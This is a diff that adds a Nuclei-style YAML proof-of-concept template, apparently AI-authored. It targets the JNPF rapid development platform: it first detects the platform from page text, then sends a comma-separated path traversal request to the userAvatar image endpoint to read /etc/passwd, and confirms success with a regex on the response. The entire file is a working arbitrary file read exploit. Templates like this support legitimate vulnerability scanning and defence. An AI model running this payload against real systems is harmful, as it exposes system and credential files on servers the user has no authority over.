@@ -1,0 +1,37 @@
+id: poc-yaml-jnpf-soft-useravatar-anyfile-read
+info:
+  name: JNPF快速开发平台 userAvatar 任意文件文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "JNPF快速开发平台"
+        part: body
+  - raw:
+      - |
+        GET /api/file/Image/userAvatar/aa,..,..,..,..,..,..,..,..,..,etc,passwd HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:.*:/bin"
+      - type: word
+        words:
+          - "<"
+        negative: true
+        part: body
